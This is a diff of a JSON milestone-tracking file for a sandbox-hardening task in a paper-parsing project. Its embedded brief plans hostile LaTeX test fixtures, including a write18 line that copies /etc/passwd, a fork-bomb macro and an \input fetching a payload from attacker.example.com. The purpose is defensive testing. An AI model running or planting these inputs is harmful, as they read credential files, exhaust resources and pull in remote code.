@@ -4,16 +4,33 @@
   "critics_run": [],
   "critique_finding_counts": {
     "critical": 0,
-    "high": 0,
-    "low": 0,
-    "medium": 0
+    "high": 2,
+    "low": 5,
+    "medium": 8
   },
   "critique_path": null,
-  "deferred_findings": [],
+  "deferred_findings": [
+    "F7",
+    "F8",
+    "F9",
+    "F10",
+    "IS5"
+  ],
   "external_writes_authorized": false,
   "external_writes_completed": false,
   "external_writes_required": [],
-  "fixed_findings": [],
+  "fixed_findings": [
+    "F1",
+    "F2",
+    "F3",
+    "F4",
+    "F5",
+    "F6",
+    "IS1",
+    "IS2",
+    "IS3",
+    "IS4"
+  ],
   "id": "E13_S03",
   "implementation_base": "b6871112979ef3b2323f99a152d141757c55d98f",
   "implementation_branch": "main",
@@ -25,7 +42,7 @@
   "implementation_specialist": null,
   "invalidated_findings": [],
   "milestone_brief": "### E13_S03 \u2014 Threat-3: LaTeXML sandbox hostile-input validation\n\n**Status:** NEW\n**Tier:** 5\n**Effort:** L\n**Dependencies:** E06_S03\n\n**Description.** LaTeX is Turing-complete. A malicious paper can ship `.tex` source designed to consume infinite RAM, write arbitrary files, or attempt to shell out. The LaTeXML subprocess sandbox (hard timeout, rootless container with unprivileged UID, filesystem write whitelist, no network access) was specified in E02_S02 and `.claude/notes/08-security-observability-ops.md` \u00a7 Threat 3. This milestone proves the sandbox actually holds against a curated set of hostile fixtures.\n\nFive hostile fixture papers are authored in `tests/security/fixtures/latexml/`:\n1. `infinite_recursion.tex` \u2014 a macro that calls itself until the timeout fires\n2. `write18_shellout.tex` \u2014 `\\write18{cat /etc/passwd > /tmp/pwned.txt}` attempt\n3. `fork_bomb.tex` \u2014 `\\newcommand{\\fb}{\\fb\\fb}` triggered recursively\n4. `large_alloc.tex` \u2014 allocates a 4 GB buffer via a custom Lua snippet\n5. `network_call.tex` \u2014 attempts a `\\input{http://attacker.example.com/payload.tex}`\n\nFor each fixture: the subprocess must terminate within the documented timeout (300 seconds), the host filesystem outside the per-paper output directory must be unmodified, and the paper must be marked `parse_status=\"parse_failed\"` (not a silent success).\n\nOn Docker the `--network=none` flag is verified to be present in the compose config and confirmed via `docker inspect`. On macOS the `sandbox-exec` profile (committed to `infra/latexml/sandbox.sb`) must deny network and restrict filesystem writes.\n\n**Deliverables.**\n- `tests/security/test_latexml_sandbox.py` \u2014 5 hostile-fixture test cases; each asserts timeout firing, host filesystem clean, parse_status=parse_failed\n- `tests/security/fixtures/latexml/` \u2014 the 5 `.tex` fixture files\n- `infra/latexml/sandbox.sb` \u2014 macOS sandbox-exec profile\n- `docs/security/threat-3-audit.md` \u2014 sandbox configuration documentation\n\n**Acceptance criteria.**\n- [ ] `pytest tests/security/test_latexml_sandbox.py` passes (all 5 fixtures contained)\n- [ ] Each fixture: subprocess killed \u2264 300 s, host filesystem outside the output dir is unmodified\n- [ ] Docker compose config has `--network=none` on the LaTeXML service; verified by `docker inspect`\n- [ ] macOS: `sandbox-exec -f infra/latexml/sandbox.sb` profile committed and tested in CI\n- [ ] All 5 papers land in `ops/parser-failures/` with `parse_status=\"parse_failed\"`\n\n**Out of scope.** Defending against hostile arXiv content at the network level (Threat 7). Defending against compromised model weights (Threat 6). Custom seccomp profiles for Linux (documented as future hardening in `docs/security/threat-3-audit.md`).\n\n**Risk notes.**\n- Closes Threat 3 (LaTeXML on hostile source) from `.claude/notes/08-security-observability-ops.md` \u00a7 Threat 3. HIGH severity: a successful sandbox escape runs arbitrary code on the developer workstation.\n- LaTeXML subprocess must never run inside the MCP server process (which has network access). This separation is load-bearing for containment.\n\n**Labels.** `area:security`, `risk:high`, `tier:5`\n\n---",
-  "phase": "rectify-running",
+  "phase": "complete",
   "phase_history": [
     {
       "entered_at": "2026-05-18T01:25:48Z",
@@ -64,14 +81,19 @@
     },
     {
       "entered_at": "2026-05-18T01:55:03Z",
-      "left_at": null,
+      "left_at": "2026-05-18T02:03:23Z",
       "phase": "rectify-running"
+    },
+    {
+      "entered_at": "2026-05-18T02:03:23Z",
+      "left_at": null,
+      "phase": "complete"
     }
   ],
-  "rectification_commit": null,
+  "rectification_commit": "4109172e320bf500f1b89d8e80eb106adc786949",
   "regression_tests_added": [],
   "research_briefs": [],
   "research_mode": "standard",
   "research_synthesis": "/Users/chris.dare/Personal/SourceCode/arXMCP/.claude/notes/milestones/E13_S03/research-synthesis.md",
-  "updated_at": "2026-05-18T01:55:03Z"
+  "updated_at": "2026-05-18T02:03:23Z"
 }
